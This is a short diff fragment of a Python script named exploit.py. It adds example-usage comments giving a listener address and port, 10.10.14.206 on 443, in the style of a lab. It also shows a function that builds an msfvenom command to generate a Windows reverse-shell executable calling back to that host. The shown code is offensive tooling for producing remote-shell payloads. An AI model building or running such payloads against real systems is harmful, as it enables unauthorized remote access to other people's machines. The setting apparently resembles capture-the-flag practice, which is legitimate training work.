@@ -1,6 +1,10 @@
 import subprocess
 import argparse
 
+#EXAMPLE USAGE:
+#python exploit.py -l 10.10.14.206 -p 443 
+#LHOST 10.10.14.206 with LPORT 443
+
 
 def run_exploit(payload, lhost, lport):
     cmd = f"msfvenom -p {payload} LHOST={lhost} lport={lport} -f exe > WindowsShell64.exe"
